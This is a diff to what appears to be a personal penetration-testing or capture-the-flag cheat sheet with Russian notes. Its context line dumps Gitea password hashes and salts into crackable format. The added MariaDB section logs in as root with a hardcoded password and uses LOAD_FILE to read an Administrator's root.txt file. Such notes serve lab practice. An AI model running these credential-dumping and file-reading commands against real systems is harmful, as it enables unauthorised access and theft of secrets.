@@ -158,6 +158,12 @@ select * from NOTE;
 
  вытянуть все       sqlite3 gitea.db "select passwd,salt,name from user" | while read data; do digest=$(echo "$data" | cut -d'|' -f1 | xxd -r -p | base64); salt=$(echo "$data" | cut -d'|' -f2 | xxd -r -p | base64); name=$(echo $data | cut -d'|' -f 3); echo "${name}:sha256:50000:${salt}:${digest}"; done | tee gitea.hashes
 
+# MariaDB
+
+        mysql -h 127.0.0.1 -u root -p'ibWijteig5'
+        mysql -h 127.0.0.1 -u root -p'ibWijteig5' -e "SHOW DATABASES;"
+        $ mysql -h 127.0.0.1 -u root -p'ibWijteig5' outputwall -e "SHOW TABLES;"
+        mysql> SELECT LOAD_FILE('C:\\Users\\Administrator\\Desktop\\root.txt');
 
 # SQL I
     # Union based   
